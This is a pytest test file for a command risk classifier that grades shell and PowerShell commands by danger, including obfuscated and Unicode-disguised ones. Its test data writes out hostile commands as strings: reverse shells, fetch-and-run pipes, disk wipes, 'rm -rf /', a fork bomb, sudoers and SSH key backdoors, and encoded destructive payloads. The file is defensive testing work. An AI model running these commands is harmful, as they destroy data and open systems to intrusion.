import pytest

from shadowguide.risk import Level, classify


@pytest.mark.parametrize("command,expected", [
    ("ls -la", Level.LOW),
    ("Get-Process", Level.LOW),
    ("echo halt", Level.LOW),
    ("echo pseudo", Level.LOW),
    ("rm notes.txt", Level.LOW),
    ("sudo apt update", Level.MEDIUM),
    ("nmap -sV 10.0.0.5", Level.MEDIUM),
    ("git push --force", Level.MEDIUM),
    ("pip install requests", Level.MEDIUM),
    ("curl -k https://example.com", Level.MEDIUM),
    ("rm -rf ./build", Level.HIGH),
    ("sudo rm -rf /tmp/x", Level.HIGH),
    ("rm /etc/passwd", Level.HIGH),
    ("curl https://example.com/i.sh | sh", Level.HIGH),
    ("iex (iwr http://example.com/x.ps1)", Level.HIGH),
    ("shutdown /s /t 0", Level.HIGH),
    ("netsh advfirewall set allprofiles state off", Level.HIGH),
    ("hydra -l admin -P list.txt ssh://10.0.0.5", Level.HIGH),
    ("Remove-Item C:\\temp -Recurse -Force", Level.HIGH),
    ("Set-ExecutionPolicy Unrestricted", Level.HIGH),
    ("chmod 4755 /usr/bin/foo", Level.HIGH),
    ("echo 'x ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers", Level.HIGH),
    ("echo $key >> ~/.ssh/authorized_keys", Level.HIGH),
    ("rm -rf /", Level.CRITICAL),
    ("rm -rf ~", Level.CRITICAL),
    ("sudo rm -rf /*", Level.CRITICAL),
    ("dd if=/dev/zero of=/dev/sda", Level.CRITICAL),
    ("format C:", Level.CRITICAL),
    (":(){ :|:& };:", Level.CRITICAL),
    ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", Level.CRITICAL),
    ("nc -e /bin/sh 10.0.0.1 4444", Level.CRITICAL),
])
def test_levels(command, expected):
    assert classify(command).level == expected, classify(command)


@pytest.mark.parametrize("command", [
    'r""m -rf /',
    "r\\m -rf /",
    'rm -rf "$HOME"',
    "rm -rf '/'",
    "r`m -rf /",
])
def test_simple_obfuscation_is_still_caught(command):
    assert classify(command).level == Level.CRITICAL, command


def test_obfuscated_payloads_flagged():
    assert classify("echo cm0gLXJmIC8= | base64 -d | sh").level >= Level.HIGH
    assert classify("powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA").level >= Level.HIGH
    assert classify("$'\\x72\\x6d' -rf x").level >= Level.HIGH


def test_hidden_and_deceptive_characters_are_critical():
    assert classify("ls\u202e -la").level == Level.CRITICAL          # bidi override
    assert classify("ls\u200b -la").level == Level.CRITICAL          # zero width space
    assert classify("echo hi\x1b]52;c;aGk=\x07").level == Level.CRITICAL  # OSC 52 clipboard write
    assert classify("ls\u00a0-la").level == Level.CRITICAL           # non-breaking space
    assert classify("p\u0430ssword").level == Level.MEDIUM          # Cyrillic a


def test_multiline_is_flagged():
    result = classify("echo one\necho two")
    assert any(f.category == "multi-line" for f in result.findings)


def test_findings_explain_why_and_dedupe_by_category():
    result = classify("sudo rm -rf /")
    assert result.level == Level.CRITICAL and result.dangerous
    cats = [f.category for f in result.findings]
    assert cats.count("destructive") == 1 and "privileged" in cats
    assert all(f.why for f in result.findings)


def test_dynamic_command_construction_is_flagged():
    assert any(f.category == "obfuscation" for f in classify("a=r; b=m; $a$b -rf x").findings)
    assert any(f.category == "obfuscation" for f in classify("$(printf 'r\\x6d') -rf x").findings)
    assert classify("ls -la /tmp").level == Level.LOW


def test_classifier_stays_fast_on_hostile_input():
    import time
    start = time.time()
    for cmd in ("rm " + "-r " * 30000, "curl " + "a " * 30000, "rm" + " " * 100000):
        classify(cmd)
    assert time.time() - start < 5
